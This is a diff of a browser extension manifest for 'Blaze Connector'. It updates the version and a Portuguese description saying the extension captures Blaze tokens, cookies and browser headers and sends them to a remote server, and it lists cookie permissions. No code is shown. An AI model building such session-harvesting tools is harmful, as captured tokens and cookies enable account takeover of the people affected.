@@ -1,8 +1,8 @@
 {
   "manifest_version": 3,
   "name": "Blaze Connector",
-  "version": "1.0.0",
-  "description": "Captura token e cookies da Blaze e envia para o servidor BR.",
+  "version": "2.0.0",
+  "description": "Captura token, cookies e headers do navegador da Blaze e envia para o servidor BR.",
   "permissions": [
     "storage",
     "cookies",
